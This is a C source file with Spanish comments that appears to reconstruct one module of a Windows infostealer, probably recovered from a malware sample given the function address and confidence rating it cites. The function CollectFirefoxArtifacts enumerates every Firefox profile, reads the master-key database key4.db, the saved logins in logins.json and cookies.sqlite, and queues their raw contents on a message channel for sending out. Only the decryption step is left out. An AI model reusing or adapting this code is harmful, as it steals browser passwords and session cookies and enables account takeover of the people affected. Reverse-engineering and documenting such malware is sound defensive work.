/* ============================================================
 * Capacidad 14/15 — Robo de artefactos Firefox
 * Función C : CollectFirefoxArtifacts
 * Dirección : 0x180007110   · Nodo N4   · Confianza: Media-alta
 * ------------------------------------------------------------
 * Recorre los perfiles de Firefox (%APPDATA%\Mozilla\Firefox\Profiles)
 * y recolecta key4.db, logins.json y cookies.sqlite. El descifrado de
 * credenciales y cookies usa el material NSS (PKCS#11).
 * ============================================================
 */

#include "00_tipos_comunes.h"

static const wchar_t *const FIREFOX_ARTIFACTS[] = {
    L"key4.db",        /* clave maestra NSS (PKCS#11) */
    L"logins.json",    /* credenciales cifradas       */
    L"cookies.sqlite", /* cookies                     */
    NULL
};

/* Lee un archivo completo a memoria (CreateFileW/ReadFile). */
static ByteBuffer ReadFileArtifact(const wchar_t *path)
{
    ByteBuffer out = { 0, 0, 0 };

    HANDLE h = CreateFileW(path, GENERIC_READ,
                           FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
                           NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE)
        return out;

    DWORD hi = 0;
    DWORD lo = GetFileSize(h, &hi);
    size_t size = ((size_t)hi << 32) | lo;

    if (size > 0 && size < 0x4000000u) {
        out.data = (uint8_t *)HeapAlloc(GetProcessHeap(), 0, size);
        if (out.data != NULL) {
            DWORD read = 0;
            ReadFile(h, out.data, (DWORD)size, &read, NULL);
            out.len = read;
            out.cap = read;
        }
    }
    CloseHandle(h);
    return out;
}

static void QueueFileArtifact(Channel *channel, const wchar_t *path)
{
    ByteBuffer b = ReadFileArtifact(path);
    if (b.data == NULL)
        return;
    QueueTypedMessage(channel, MSG_BROWSER_DATA, b);
}

/* ------------------------------------------------------------------
 * 0x180007110 — recorrido de perfiles de Firefox [condicionado].
 * El descifrado de credenciales y cookies usa material NSS (PKCS#11);
 * se documenta como comportamiento, no se reproduce el descifrado.
 * ------------------------------------------------------------------ */
void CollectFirefoxArtifacts(Channel *channel)
{
    if (channel == NULL)
        return;

    wchar_t roaming[MAX_PATH] = { 0 };
    if (GetEnvironmentVariableW(L"APPDATA", roaming, _countof(roaming)) == 0)
        return;

    wchar_t profiles[MAX_PATH];
    _snwprintf_s(profiles, _countof(profiles), _TRUNCATE,
                 L"%s\\Mozilla\\Firefox\\Profiles", roaming);

    wchar_t spec[MAX_PATH];
    _snwprintf_s(spec, _countof(spec), _TRUNCATE, L"%s\\*", profiles);

    WIN32_FIND_DATAW fd;
    HANDLE f = FindFirstFileW(spec, &fd);
    if (f == INVALID_HANDLE_VALUE)
        return;

    do {
        if ((fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) &&
            fd.cFileName[0] != L'.') {
            wchar_t dir[MAX_PATH];
            _snwprintf_s(dir, _countof(dir), _TRUNCATE,
                         L"%s\\%s", profiles, fd.cFileName);

            for (int i = 0; FIREFOX_ARTIFACTS[i] != NULL; i++) {
                wchar_t full[MAX_PATH];
                _snwprintf_s(full, _countof(full), _TRUNCATE,
                             L"%s\\%s", dir, FIREFOX_ARTIFACTS[i]);
                QueueFileArtifact(channel, full);
            }
        }
    } while (FindNextFileW(f, &fd));
    FindClose(f);
}
